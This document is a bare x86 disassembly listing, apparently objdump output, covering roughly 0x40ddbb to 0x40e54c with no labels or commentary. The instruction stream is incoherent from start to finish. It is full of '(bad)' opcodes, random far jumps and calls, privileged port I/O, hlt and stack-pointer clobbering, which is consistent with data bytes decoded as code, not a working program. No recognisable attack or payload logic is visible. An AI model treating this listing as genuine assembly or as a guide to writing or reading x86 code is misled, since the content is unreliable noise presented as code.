  40ddbb:	imul   ecx,DWORD PTR [eax+ebp*8],0xeb46909b
  40ddc2:	and    al,0x9e
  40ddc4:	pop    ecx
  40ddc5:	mov    ds:0x3f417e92,eax
  40ddca:	stos   BYTE PTR es:[edi],al
  40ddcb:	in     eax,dx
  40ddcc:	add    BYTE PTR [edx],bh
  40ddce:	xor    BYTE PTR [ebp-0x75],bl
  40ddd1:	mov    ecx,0x5109a94a
  40ddd6:	jmp    0x4852:0x64ebb6e7
  40dddd:	sub    DWORD PTR [edi],ecx
  40dddf:	push   ecx
  40dde0:	inc    edi
  40dde1:	mov    ah,0x26
  40dde3:	ins    BYTE PTR es:[edi],dx
  40dde4:	mov    gs,WORD PTR [ebp-0x4a7c9ca3]
  40ddea:	adc    DWORD PTR fs:[ecx-0x58],ebp
  40ddee:	push   0x97f1f4d4
  40ddf3:	in     eax,dx
  40ddf4:	bound  edi,QWORD PTR ds:0x817eae20
  40ddfa:	fs lahf 
  40ddfc:	sbb    ah,BYTE PTR [ebp+0x74cce2d8]
  40de02:	js     0x40de29
  40de04:	xchg   esp,eax
  40de05:	push   eax
  40de06:	call   0xf63a:0xc554e171
  40de0d:	xor    edx,esi
  40de0f:	and    DWORD PTR [ecx+0x68],0xffffffa5
  40de13:	inc    esp
  40de14:	imul   DWORD PTR ds:0x247d0104
  40de1a:	arpl   WORD PTR [ebx-0x1140783e],di
  40de20:	jbe    0x40de05
  40de22:	in     al,0x76
  40de24:	push   esp
  40de25:	mov    BYTE PTR [ecx],al
  40de27:	mov    ah,0xf7
  40de29:	jns    0x40de00
  40de2b:	push   ebx
  40de2c:	pop    esp
  40de2d:	int3   
  40de2e:	sub    eax,0x286ba953
  40de33:	xlat   BYTE PTR ds:[ebx]
  40de34:	pop    edx
  40de35:	adc    DWORD PTR ss:[edx],edi
  40de38:	fcomp  QWORD PTR [ebx+0x7b]
  40de3b:	push   ebx
  40de3c:	or     BYTE PTR [eax+0x50e09b8a],bl
  40de42:	pop    es
  40de43:	jnp    0x40de15
  40de45:	and    dl,BYTE PTR [ebx]
  40de47:	push   0x25
  40de49:	pop    esp
  40de4a:	xchg   esp,eax
  40de4b:	cmp    DWORD PTR [eax+0x603ff6ad],esi
  40de51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40de52:	push   ebx
  40de53:	sub    DWORD PTR [esi-0x7],ebx
  40de56:	sar    DWORD PTR [eax],cl
  40de58:	sub    DWORD PTR [edi-0x64],0x7a
  40de5c:	jo     0x40de2e
  40de5e:	push   0xcbb694cf
  40de63:	and    BYTE PTR [eax+0x6967b42e],cl
  40de69:	bound  esi,QWORD PTR [ebp+0x19164086]
  40de6f:	jo     0x40decf
  40de71:	or     esp,DWORD PTR [edx]
  40de73:	mov    gs,WORD PTR [edi+0x2b]
  40de76:	imul   esp,DWORD PTR [edx],0xffffffdb
  40de79:	fnsave [eax-0x3a]
  40de7c:	fwait
  40de7d:	mov    edi,0x7d22bd60
  40de82:	loopne 0x40def6
  40de84:	mov    al,ds:0x1ee23938
  40de89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40de8a:	dec    ecx
  40de8b:	pop    ss
  40de8c:	inc    esi
  40de8d:	shr    edx,0x19
  40de90:	in     al,0xa7
  40de92:	icebp  
  40de93:	pop    esp
  40de94:	xor    ah,0xf7
  40de97:	mov    bh,0x75
  40de99:	enter  0xe680,0x2c
  40de9d:	aas    
  40de9e:	or     DWORD PTR [edx],ebx
  40dea0:	mov    bh,0xde
  40dea2:	repz (bad) 
  40dea4:	clc    
  40dea5:	jg     0x40ded8
  40dea7:	xor    al,0xd4
  40dea9:	and    bl,BYTE PTR [ebx]
  40deab:	dec    edi
  40deac:	out    0xc5,eax
  40deae:	jae    0x40de6b
  40deb0:	push   cs
  40deb1:	sbb    DWORD PTR [esi],ebx
  40deb3:	repnz mov dl,0x71
  40deb6:	jnp    0x40de4b
  40deb8:	dec    eax
  40deb9:	hlt    
  40deba:	cmp    eax,0xad56be8c
  40debf:	cli    
  40dec0:	jp     0x40df0f
  40dec2:	repz mov ebx,0x1554b520
  40dec8:	mov    ebx,0x801c403a
  40decd:	jmp    0x26d3:0xcbfb0186
  40ded4:	inc    esi
  40ded5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ded6:	int    0xe5
  40ded8:	jg     0x40de66
  40deda:	hlt    
  40dedb:	xlat   BYTE PTR ds:[ebx]
  40dedc:	add    ch,BYTE PTR [ebp+eax*4-0x56]
  40dee0:	dec    ecx
  40dee1:	mov    bh,0x2f
  40dee3:	lds    esi,FWORD PTR [edi-0x793cf773]
  40dee9:	daa    
  40deea:	inc    ecx
  40deeb:	in     al,dx
  40deec:	xchg   esp,eax
  40deed:	xor    DWORD PTR [ecx],0xe9ef9e8f
  40def3:	pop    ebx
  40def4:	mov    ds:0x457e1df3,eax
  40def9:	sub    cl,BYTE PTR [ecx-0x9]
  40defc:	or     BYTE PTR [ebx-0x41ce5f83],dl
  40df02:	adc    edi,DWORD PTR [ecx]
  40df04:	std    
  40df05:	inc    esi
  40df06:	jbe    0x40df53
  40df08:	outs   dx,BYTE PTR ds:[esi]
  40df09:	push   ebp
  40df0a:	cmp    al,0x58
  40df0c:	push   edi
  40df0d:	adc    DWORD PTR [ebx],esp
  40df0f:	in     al,dx
  40df10:	push   edx
  40df11:	or     eax,0x60ba4dde
  40df16:	test   al,0xf9
  40df18:	(bad)  
  40df19:	and    eax,0x81836119
  40df1e:	inc    BYTE PTR [edx+ebp*2]
  40df21:	out    0x84,eax
  40df23:	test   DWORD PTR [esi+0x54b3aa3b],edi
  40df29:	jne    0x40df13
  40df2b:	out    0xa0,al
  40df2d:	pop    edi
  40df2e:	dec    ebp
  40df2f:	loop   0x40df25
  40df31:	pop    edi
  40df32:	(bad)  
  40df33:	mov    BYTE PTR [ecx+0x5850be18],cl
  40df39:	sub    esp,DWORD PTR [edx+0x6e8a3512]
  40df3f:	je     0x40def2
  40df41:	rcr    BYTE PTR [esi+0x2f85ff6b],1
  40df47:	in     al,dx
  40df48:	rcr    BYTE PTR [esi+ebx*4+0x5e53de7c],cl
  40df4f:	dec    edx
  40df50:	into   
  40df51:	test   eax,0x5e871832
  40df56:	jae    0x40dfc8
  40df58:	jmp    0x40dfa1
  40df5a:	push   0x693908a4
  40df5f:	ror    DWORD PTR [esi+edi*1-0x53],cl
  40df63:	push   eax
  40df64:	lods   al,BYTE PTR ds:[esi]
  40df65:	cwde   
  40df66:	jl     0xd0aa65ff
  40df6c:	pop    edi
  40df6d:	mov    cs:0xdd607660,eax
  40df73:	fimul  DWORD PTR [eax+0x40]
  40df76:	push   eax
  40df77:	fld    QWORD PTR [eax+0x3ef60485]
  40df7d:	je     0x40dfeb
  40df7f:	inc    ecx
  40df80:	neg    DWORD PTR [edi]
  40df82:	mov    ds:0xcc2d7ae9,al
  40df87:	pop    eax
  40df88:	add    al,0xec
  40df8a:	scas   eax,DWORD PTR es:[edi]
  40df8b:	inc    esi
  40df8c:	add    dl,BYTE PTR gs:[eax+0x36159330]
  40df93:	(bad)  
  40df95:	mov    DWORD PTR [ebp-0x66b14bda],ebx
  40df9b:	(bad)  
  40df9c:	sbb    DWORD PTR [eax+0x426c3f1],edx
  40dfa2:	mov    dl,0xb3
  40dfa4:	adc    esp,DWORD PTR [ebx+0x62]
  40dfa7:	xchg   edi,eax
  40dfa8:	data16 in al,0x66
  40dfab:	sbb    al,0xa4
  40dfad:	loope  0x40e029
  40dfaf:	dec    ebp
  40dfb0:	push   ecx
  40dfb1:	adc    ebp,DWORD PTR [ebx+0x415106a8]
  40dfb7:	in     eax,0xbc
  40dfb9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dfba:	sbb    eax,0xacc8aa52
  40dfbf:	mov    ecx,0x1e527979
  40dfc4:	sti    
  40dfc5:	jns    0x40e007
  40dfc7:	mov    dl,0xde
  40dfc9:	and    eax,0x174160d9
  40dfce:	add    al,dl
  40dfd0:	or     bh,BYTE PTR [edi]
  40dfd2:	call   0xc3756b01
  40dfd7:	cmp    bl,BYTE PTR [esi]
  40dfd9:	ror    esp,0x96
  40dfdc:	(bad)  
  40dfdd:	jb     0x40dfe7
  40dfdf:	daa    
  40dfe0:	and    eax,0x1a8e8f36
  40dfe5:	cli    
  40dfe6:	lea    ebp,[ebp-0x79cfe624]
  40dfec:	inc    esi
  40dfed:	cmp    dh,BYTE PTR [esi+0x263d3c20]
  40dff3:	add    al,0x7a
  40dff5:	adc    DWORD PTR [esi-0x7b],esp
  40dff8:	pop    ss
  40dff9:	cmp    DWORD PTR [ebp-0x10],esi
  40dffc:	push   0x31
  40dffe:	push   ds
  40dfff:	sbb    DWORD PTR [eax-0x42],esi
  40e002:	add    DWORD PTR [edx],esi
  40e004:	enter  0x1d50,0x8c
  40e008:	and    eax,DWORD PTR [ebx]
  40e00a:	add    ch,ch
  40e00c:	mov    ah,0xb9
  40e00e:	ja     0x40e02f
  40e010:	daa    
  40e011:	pop    ss
  40e012:	push   ecx
  40e013:	pinsrw mm0,eax,0x40
  40e017:	pop    esp
  40e018:	sub    edi,DWORD PTR [esi+0x44034e13]
  40e01e:	es nop
  40e020:	into   
  40e021:	cwde   
  40e022:	push   ss
  40e023:	ss ja  0x40dfe4
  40e026:	mov    ebx,eax
  40e028:	jns    0x40dff9
  40e02a:	push   eax
  40e02b:	test   dh,ah
  40e02d:	push   ebp
  40e02e:	rol    BYTE PTR [eax],0x40
  40e031:	dec    esi
  40e032:	jmp    0x40e001
  40e034:	aaa    
  40e035:	inc    ebx
  40e036:	dec    ecx
  40e037:	cmc    
  40e038:	outs   dx,DWORD PTR ds:[esi]
  40e039:	cmc    
  40e03a:	fadd   QWORD PTR [edi+0x1348b59a]
  40e040:	xchg   ecx,eax
  40e041:	inc    eax
  40e042:	stc    
  40e043:	and    edx,DWORD PTR [esi-0x34]
  40e046:	xor    DWORD PTR [ebx+ecx*8],esi
  40e049:	or     bh,cl
  40e04b:	nop
  40e04c:	jmp    0x40e025
  40e04e:	in     eax,0x26
  40e050:	jmp    0x40e092
  40e052:	out    0x18,al
  40e054:	test   BYTE PTR [ecx-0x21],ch
  40e057:	sahf   
  40e058:	add    ch,BYTE PTR [eax-0x2fc119b2]
  40e05e:	cdq    
  40e05f:	mov    ds:0xcc40420d,al
  40e064:	or     dl,BYTE PTR [edi]
  40e066:	call   0x9548db5a
  40e06b:	sti    
  40e06c:	ror    ebx,1
  40e06e:	rcl    BYTE PTR [edx+0x1a1b9cb],cl
  40e074:	jno    0x40e05d
  40e076:	pop    ebx
  40e077:	add    DWORD PTR [ebx+esi*2+0x5908aeb3],0x8448fa0
  40e082:	push   DWORD PTR ds:0x26dd76af
  40e088:	mov    cl,0xdd
  40e08a:	cwde   
  40e08b:	sbb    al,0xb6
  40e08d:	arpl   ax,dx
  40e08f:	sbb    eax,0xcb7d3b39
  40e094:	pop    ebx
  40e095:	fdiv   DWORD PTR ds:0xf594619f
  40e09b:	jnp    0x40e08e
  40e09d:	lock push ss
  40e09f:	sub    DWORD PTR [edx],edi
  40e0a1:	mov    edx,0x8b029c7c
  40e0a6:	pop    esi
  40e0a7:	pop    es
  40e0a8:	pop    ebx
  40e0a9:	fwait
  40e0aa:	mov    fs,WORD PTR [ebp+eax*1+0x3f80de3d]
  40e0b1:	push   edx
  40e0b2:	lods   al,BYTE PTR ds:[esi]
  40e0b3:	call   0xe648:0x48d36b7a
  40e0ba:	adc    al,0x5b
  40e0bc:	hlt    
  40e0bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e0be:	jmp    0x40e06e
  40e0c0:	(bad)  
  40e0c1:	jle    0x40e0b7
  40e0c3:	lods   al,BYTE PTR ds:[esi]
  40e0c4:	(bad)  
  40e0c5:	push   eax
  40e0c6:	imul   BYTE PTR [esi+0x1d]
  40e0c9:	call   0x585511be
  40e0ce:	call   FWORD PTR [esi+0x18]
  40e0d1:	add    eax,0x544cc3dc
  40e0d6:	adc    ecx,DWORD PTR [ebp-0x12]
  40e0d9:	(bad)  
  40e0db:	cmc    
  40e0dc:	pop    esp
  40e0dd:	jbe    0x40e062
  40e0df:	outs   dx,BYTE PTR ds:[esi]
  40e0e0:	mov    ch,0x7d
  40e0e2:	sbb    DWORD PTR [edi],0x6e857052
  40e0e8:	sbb    edx,eax
  40e0ea:	jge    0x40e0a2
  40e0ec:	(bad)  
  40e0ed:	jmp    0x83d2504e
  40e0f2:	(bad)  
  40e0f3:	in     eax,dx
  40e0f4:	jl     0x40e0f5
  40e0f6:	(bad)  
  40e0f7:	jo     0x40e15d
  40e0f9:	dec    edx
  40e0fa:	lds    edi,FWORD PTR [ecx+0x43]
  40e0fd:	test   DWORD PTR [eax+0x777fb133],esp
  40e103:	lock aas 
  40e105:	mov    WORD PTR [ebx+0x10],es
  40e108:	mov    bl,0x9
  40e10a:	xchg   cl,ah
  40e10c:	lock or BYTE PTR [edx+ecx*1],bl
  40e110:	or     eax,0x75a776c7
  40e115:	xlat   BYTE PTR ds:[ebx]
  40e116:	lds    esp,FWORD PTR [edi+0x26]
  40e119:	adc    bl,BYTE PTR [ebx]
  40e11b:	xor    bl,BYTE PTR [eax-0xa]
  40e11e:	push   edi
  40e11f:	or     ebx,edx
  40e121:	mov    ch,0xfd
  40e123:	imul   ebx,DWORD PTR [esi-0x36],0x46b66256
  40e12a:	in     al,0x84
  40e12c:	fcomp  QWORD PTR [eax]
  40e12e:	sbb    al,0x4c
  40e130:	mov    bh,0x60
  40e132:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e133:	pop    esp
  40e134:	pop    ss
  40e135:	shr    edx,0xd4
  40e138:	fstp   QWORD PTR [ecx]
  40e13a:	push   esi
  40e13b:	push   es
  40e13c:	cmp    ecx,ecx
  40e13e:	out    dx,al
  40e13f:	sub    bl,bh
  40e141:	cmp    al,0xc0
  40e143:	sbb    bl,BYTE PTR [edx+ebx*1]
  40e146:	mov    bh,0xc9
  40e148:	fs pusha 
  40e14a:	test   BYTE PTR [ebx+edi*8],al
  40e14d:	inc    esi
  40e14e:	sbb    al,BYTE PTR [esi-0x6a]
  40e151:	fbstp  TBYTE PTR [ebx+0x15e2aadf]
  40e157:	add    BYTE PTR [ebx],dl
  40e159:	dec    edx
  40e15a:	es das 
  40e15c:	ror    DWORD PTR ds:0x2982670b,1
  40e162:	aas    
  40e163:	je     0x40e1d3
  40e165:	cmp    ebp,DWORD PTR [ecx-0x72]
  40e168:	iret   
  40e169:	lods   al,BYTE PTR ds:[esi]
  40e16a:	call   0x19cf:0xf8612217
  40e171:	sbb    al,0x72
  40e173:	jecxz  0x40e1e3
  40e175:	call   0x7a2c68fe
  40e17a:	js     0x40e19f
  40e17c:	int    0x2c
  40e17e:	and    BYTE PTR [ebp+esi*4+0x2fdf6248],ch
  40e185:	adc    cl,BYTE PTR [esi]
  40e187:	xchg   BYTE PTR [edx-0xc7de4e3],cl
  40e18d:	pop    ds
  40e18e:	xor    eax,0x8a54d517
  40e193:	cdq    
  40e194:	jb     0x40e1de
  40e196:	jns    0x40e1ee
  40e198:	dec    esi
  40e199:	lea    eax,[esi+0x74]
  40e19c:	xor    edx,DWORD PTR [ebp-0x4d81f1dd]
  40e1a2:	fiadd  DWORD PTR [ecx]
  40e1a4:	shl    ah,0x31
  40e1a7:	sti    
  40e1a8:	mov    bl,0x24
  40e1aa:	sbb    DWORD PTR [ecx],esi
  40e1ac:	jecxz  0x40e1e9
  40e1ae:	rol    BYTE PTR [ecx],1
  40e1b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e1b1:	fdivr  DWORD PTR [eax+0x2b]
  40e1b4:	add    al,0xf7
  40e1b6:	cli    
  40e1b7:	and    al,0x6e
  40e1b9:	es pushf 
  40e1bb:	outs   dx,DWORD PTR ds:[esi]
  40e1bc:	mov    dl,0xa8
  40e1be:	daa    
  40e1bf:	and    eax,0x28138446
  40e1c4:	push   ebx
  40e1c5:	loopne 0x40e179
  40e1c7:	lds    ecx,FWORD PTR [edx]
  40e1c9:	outs   dx,DWORD PTR ds:[esi]
  40e1ca:	lods   al,BYTE PTR ds:[esi]
  40e1cb:	inc    edx
  40e1cc:	push   ebx
  40e1cd:	out    0x16,eax
  40e1cf:	das    
  40e1d0:	and    BYTE PTR [eax+0x0],bl
  40e1d3:	cwde   
  40e1d4:	inc    edi
  40e1d5:	nop
  40e1d6:	sbb    ah,BYTE PTR [ebp+0x5be36089]
  40e1dc:	jmp    0x7fff85b8
  40e1e1:	neg    BYTE PTR ds:0x2f29fdb1
  40e1e7:	loope  0x40e247
  40e1e9:	push   edi
  40e1ea:	fs jp  0x40e23b
  40e1ed:	nop
  40e1ee:	jg     0x40e24f
  40e1f0:	adc    eax,0xe4e8653f
  40e1f5:	push   ecx
  40e1f6:	inc    eax
  40e1f7:	inc    esi
  40e1f8:	retf   
  40e1f9:	cmp    bl,BYTE PTR [edi+0x109e334]
  40e1ff:	call   DWORD PTR [esi]
  40e201:	imul   edx,edi,0xaf156669
  40e207:	not    ebx
  40e209:	pop    bx
  40e20b:	mov    esp,0xc2805cce
  40e210:	cmp    edi,DWORD PTR [edx+0x47daf03]
  40e216:	stc    
  40e217:	or     dh,BYTE PTR [ebx+0x11e73c04]
  40e21d:	imul   ebp,esi,0xb19eb69c
  40e223:	push   edi
  40e224:	jno    0x40e226
  40e226:	stos   DWORD PTR es:[edi],eax
  40e227:	add    eax,esp
  40e229:	add    edi,DWORD PTR [edx]
  40e22b:	adc    al,0x24
  40e22d:	(bad)  
  40e22e:	or     ah,BYTE PTR ds:0x6121c8ec
  40e234:	pop    esp
  40e235:	fdivr  DWORD PTR [esi-0x21]
  40e238:	call   0xb076184d
  40e23d:	adc    bh,al
  40e23f:	je     0x40e255
  40e241:	inc    esp
  40e242:	repz add DWORD PTR [edx+0x67],esp
  40e246:	retf   
  40e247:	jmp    0x5416032c
  40e24c:	push   edi
  40e24d:	jmp    0x4d85:0x5eb1715e
  40e254:	call   0x8a0a38c4
  40e259:	xor    DWORD PTR [esi+0x766eb6ac],ebx
  40e25f:	fisubr DWORD PTR [edx-0x14]
  40e262:	adc    eax,0x926e55a2
  40e267:	ds pop ss
  40e269:	ds jbe 0x40e233
  40e26c:	neg    edi
  40e26e:	or     al,0xd2
  40e270:	pop    edi
  40e271:	iret   
  40e272:	adc    eax,0x4fc5e27c
  40e277:	jb     0x40e261
  40e279:	in     eax,dx
  40e27a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e27b:	jno    0x40e23f
  40e27d:	jmp    0x287f4a51
  40e282:	call   0x8b19:0xe4628127
  40e289:	add    DWORD PTR [ebx],edx
  40e28b:	inc    ebx
  40e28c:	pop    eax
  40e28d:	xor    bl,bh
  40e28f:	int    0x7a
  40e291:	xchg   al,bh
  40e293:	js     0x40e2a8
  40e295:	xor    edi,DWORD PTR [edx-0x7be1ef5e]
  40e29b:	fsubr  st(7),st
  40e29d:	pusha  
  40e29e:	mov    edx,DWORD PTR [ecx]
  40e2a0:	aas    
  40e2a1:	fs sbb eax,0xdd88177b
  40e2a7:	jae    0x40e232
  40e2a9:	push   eax
  40e2aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e2ab:	add    DWORD PTR [ebp+0x78],0xd7cd0053
  40e2b2:	stc    
  40e2b3:	xor    eax,0x392fb3c0
  40e2b8:	sub    BYTE PTR [esi-0x29],bh
  40e2bb:	pop    esi
  40e2bc:	ss fs pop es
  40e2bf:	cmp    DWORD PTR [ecx+0x4d],edi
  40e2c2:	add    DWORD PTR [esi-0x14950fe6],esi
  40e2c8:	ins    BYTE PTR es:[edi],dx
  40e2c9:	mov    cl,0x7f
  40e2cb:	sub    DWORD PTR cs:[ebp+edx*4+0x65],0x199c9802
  40e2d4:	(bad)  
  40e2d5:	sbb    BYTE PTR [ebx],cl
  40e2d7:	int    0xc4
  40e2d9:	int    0x6
  40e2db:	imul   ebp,DWORD PTR [ebx-0x66bb32b4],0xffffffcd
  40e2e2:	and    BYTE PTR [edi],dh
  40e2e4:	xchg   ecx,eax
  40e2e5:	sbb    al,0xc3
  40e2e7:	scas   eax,DWORD PTR es:[edi]
  40e2e8:	mov    edx,0x337c6d9d
  40e2ed:	aad    0x92
  40e2ef:	adc    eax,0xf7f2597c
  40e2f4:	or     dl,BYTE PTR [edi]
  40e2f6:	fisttp DWORD PTR [ebx]
  40e2f8:	imul   ecx,esp,0x65
  40e2fb:	pop    eax
  40e2fc:	and    DWORD PTR [edx],0xe64a8215
  40e302:	(bad)  
  40e303:	sbb    ebp,DWORD PTR [ecx+0x7490c4e7]
  40e309:	cld    
  40e30a:	call   0x6d36a0fb
  40e30f:	(bad)  
  40e311:	call   0x5e4c:0x8af5eda4
  40e318:	int3   
  40e319:	shl    DWORD PTR [edx-0x1fa49ce1],0x9a
  40e320:	xlat   BYTE PTR ds:[ebx]
  40e321:	stos   DWORD PTR es:[edi],eax
  40e322:	adc    BYTE PTR [esi+edx*1+0x76],dl
  40e326:	or     al,0x2f
  40e328:	rol    DWORD PTR [ecx],0x23
  40e32b:	aas    
  40e32c:	push   0x2215cc4d
  40e331:	neg    ebp
  40e333:	or     cl,dh
  40e335:	iret   
  40e336:	mov    eax,0x4bace00d
  40e33b:	pop    ds
  40e33c:	add    al,0x19
  40e33e:	sub    edx,ebx
  40e340:	jp     0x40e3a7
  40e342:	mov    ch,0x91
  40e344:	push   0xa3e37c30
  40e349:	or     ah,BYTE PTR [edi]
  40e34b:	push   esp
  40e34c:	nop
  40e34d:	push   ebx
  40e34e:	mov    edx,0x7705055c
  40e353:	xchg   edi,eax
  40e354:	adc    eax,DWORD PTR [ebx-0x1aa52961]
  40e35a:	inc    esp
  40e35b:	stos   BYTE PTR es:[edi],al
  40e35c:	clc    
  40e35d:	jg     0x40e36c
  40e35f:	or     ebp,DWORD PTR [ecx+eax*2-0x7e475e64]
  40e366:	lds    ebx,FWORD PTR [ecx]
  40e368:	add    al,0xf2
  40e36a:	lock sub ch,bh
  40e36d:	mov    esp,0xb824c384
  40e372:	mov    esp,0xcc4dc7fe
  40e377:	cmc    
  40e378:	cmp    edi,DWORD PTR [edi]
  40e37a:	mov    esp,ebx
  40e37c:	cld    
  40e37d:	ror    bh,0xb1
  40e380:	mov    dl,0x73
  40e382:	cwde   
  40e383:	inc    eax
  40e384:	mov    dh,0x98
  40e386:	ret    
  40e387:	test   DWORD PTR [esi],esi
  40e389:	imul   esi,edi,0x46fdea0
  40e38f:	nop
  40e390:	clc    
  40e391:	sbb    cl,BYTE PTR [eax]
  40e393:	leave  
  40e394:	inc    edx
  40e395:	add    eax,0x1c482db2
  40e39a:	push   esi
  40e39b:	push   cs
  40e39c:	aas    
  40e39d:	stos   DWORD PTR es:[edi],eax
  40e39e:	xlat   BYTE PTR ds:[ebx]
  40e39f:	sbb    DWORD PTR [edx+0x71f57c3b],0x2e7362ff
  40e3a9:	push   edx
  40e3aa:	in     eax,0xd5
  40e3ac:	pushf  
  40e3ad:	mov    esp,0xde3a22f
  40e3b2:	pop    ss
  40e3b3:	stos   BYTE PTR es:[edi],al
  40e3b4:	fld    DWORD PTR [esi+0x21a07065]
  40e3ba:	ja     0x40e411
  40e3bc:	dec    BYTE PTR [esi+edx*2]
  40e3bf:	sub    al,0x61
  40e3c1:	mov    eax,0x5825b077
  40e3c6:	mov    al,ds:0xf1f1369a
  40e3cb:	out    dx,al
  40e3cc:	jne    0x40e383
  40e3ce:	aas    
  40e3cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e3d0:	stc    
  40e3d1:	xchg   BYTE PTR [edx],bl
  40e3d3:	dec    ebx
  40e3d4:	mov    ecx,0x508c1776
  40e3d9:	jbe    0x40e36a
  40e3db:	stos   DWORD PTR es:[edi],eax
  40e3dc:	imul   ebx,DWORD PTR [edi],0x803394fc
  40e3e2:	sbb    eax,0xc9a52750
  40e3e7:	mov    edi,0xa64418f2
  40e3ec:	and    dh,ch
  40e3ee:	jbe    0x40e40d
  40e3f0:	inc    ecx
  40e3f1:	xor    ebp,ecx
  40e3f3:	mov    ebp,0x76424da0
  40e3f8:	neg    DWORD PTR [eax-0x79]
  40e3fb:	pop    ebp
  40e3fc:	ins    DWORD PTR es:[edi],dx
  40e3fd:	test   ebp,ebp
  40e3ff:	and    eax,0x9403d889
  40e404:	or     BYTE PTR [eax+0x1d],dl
  40e407:	add    eax,DWORD PTR [ecx+0x5eda5b8e]
  40e40d:	add    BYTE PTR [ecx],0xfb
  40e410:	dec    esp
  40e411:	in     al,dx
  40e412:	push   0xffffff88
  40e414:	xor    BYTE PTR [esi],ch
  40e416:	adc    dh,BYTE PTR [ebx-0x5cdbcbc]
  40e41c:	cld    
  40e41d:	in     al,0xc
  40e41f:	jg     0x40e406
  40e421:	mov    WORD PTR [esi+0x1b0ea17f],gs
  40e427:	lds    esp,FWORD PTR [esi]
  40e429:	dec    ebx
  40e42a:	sbb    eax,0x15edee4c
  40e42f:	pop    ebp
  40e430:	ss mov esp,0xedcf0470
  40e436:	jecxz  0x40e427
  40e438:	fist   WORD PTR [ecx-0x6a]
  40e43b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e43c:	rcr    BYTE PTR [eax-0x6b],cl
  40e43f:	cwde   
  40e440:	sub    eax,0x4184664c
  40e445:	aam    0xc9
  40e447:	inc    ebx
  40e448:	adc    BYTE PTR [eax-0x16],0x2b
  40e44c:	adc    ebp,ebx
  40e44e:	xor    dh,dl
  40e450:	ja     0x40e406
  40e452:	push   es
  40e453:	pop    ss
  40e454:	pop    eax
  40e455:	adc    edx,DWORD PTR [ecx+0x69461a25]
  40e45b:	outs   dx,BYTE PTR ds:[esi]
  40e45c:	inc    esi
  40e45d:	pop    esp
  40e45e:	jno    0x40e446
  40e460:	call   DWORD PTR [ecx+0x62e5b7dc]
  40e466:	xor    BYTE PTR [esi+eax*4-0x52],0xe6
  40e46b:	jmp    0x37e121a7
  40e470:	fs ret 
  40e472:	inc    ebp
  40e473:	cld    
  40e474:	das    
  40e475:	je     0x40e46a
  40e477:	jmp    0x40e41d
  40e479:	leave  
  40e47a:	cdq    
  40e47b:	call   0x5923776e
  40e480:	lock fcmovbe st,st(6)
  40e483:	add    eax,esp
  40e485:	mov    ah,0xfe
  40e487:	(bad)  
  40e488:	jle    0x40e481
  40e48a:	add    bh,ah
  40e48c:	add    eax,0x76dbc815
  40e491:	inc    ebx
  40e492:	and    DWORD PTR [eax],ecx
  40e494:	add    dl,BYTE PTR [ebp+0x599caf2]
  40e49a:	adc    cl,BYTE PTR [edi-0x222006e3]
  40e4a0:	jns    0x40e51f
  40e4a2:	fistp  WORD PTR [edx]
  40e4a4:	mov    eax,ds:0x13498e38
  40e4a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e4aa:	push   edx
  40e4ab:	pop    es
  40e4ac:	inc    eax
  40e4ad:	(bad)  
  40e4af:	sbb    ebx,edx
  40e4b1:	js     0x40e464
  40e4b3:	mov    BYTE PTR [ebp-0x1c43df10],cl
  40e4b9:	mov    al,ds:0xc3c06969
  40e4be:	inc    DWORD PTR [ebp+0x29]
  40e4c1:	add    DWORD PTR [edi-0x2c],esp
  40e4c4:	popf   
  40e4c5:	push   ebp
  40e4c6:	pop    ebp
  40e4c7:	or     edi,DWORD PTR [esi]
  40e4c9:	dec    edi
  40e4ca:	sar    DWORD PTR [ebp+0x7e],1
  40e4cd:	inc    esi
  40e4ce:	inc    ebp
  40e4cf:	out    dx,eax
  40e4d0:	or     eax,0x8ab79de9
  40e4d5:	and    eax,0x81ec3d34
  40e4da:	ja     0x40e476
  40e4dc:	mov    esp,0x35c990e2
  40e4e1:	test   al,0xa4
  40e4e3:	push   ecx
  40e4e4:	leave  
  40e4e5:	sahf   
  40e4e6:	dec    ebp
  40e4e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e4e8:	dec    edi
  40e4e9:	mov    dl,0x9d
  40e4eb:	mov    edi,0x9f34259b
  40e4f0:	aam    0x4e
  40e4f2:	dec    eax
  40e4f3:	xchg   esp,eax
  40e4f4:	aam    0x8
  40e4f6:	inc    esp
  40e4f7:	in     eax,0x8a
  40e4f9:	pop    esp
  40e4fa:	sub    BYTE PTR [ebx+eiz*2+0x3b],al
  40e4fe:	lea    esp,[ecx+0x4b7fc55b]
  40e504:	imul   dx,cx,0xab50
  40e509:	loope  0x40e57d
  40e50b:	xor    cl,BYTE PTR [edi+0x7e]
  40e50e:	add    eax,0xa274acbe
  40e513:	ret    
  40e514:	push   ebx
  40e515:	das    
  40e516:	mov    ds,WORD PTR [eax+esi*1]
  40e519:	jge    0x40e504
  40e51b:	neg    ch
  40e51d:	imul   edi,DWORD PTR [eax-0x5a],0x3c
  40e521:	xlat   BYTE PTR ds:[ebx]
  40e522:	push   esp
  40e523:	push   cs
  40e524:	xchg   ecx,eax
  40e525:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e526:	rol    edi,0x82
  40e529:	adc    ebp,ebx
  40e52b:	pop    ss
  40e52c:	sub    al,0xa9
  40e52e:	test   eax,0xa7973ae6
  40e533:	shl    DWORD PTR [ecx-0x41ed967],cl
  40e539:	shr    BYTE PTR [eax],0x35
  40e53c:	inc    ebp
  40e53d:	pop    ebp
  40e53e:	mov    ah,0x76
  40e540:	fs fs jae 0x40e53c
  40e544:	pop    edi
  40e545:	(bad)  
  40e546:	aad    0x5a
  40e548:	lahf   
  40e549:	jo     0x40e588
  40e54b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e54c:	mov    ah,0xf4
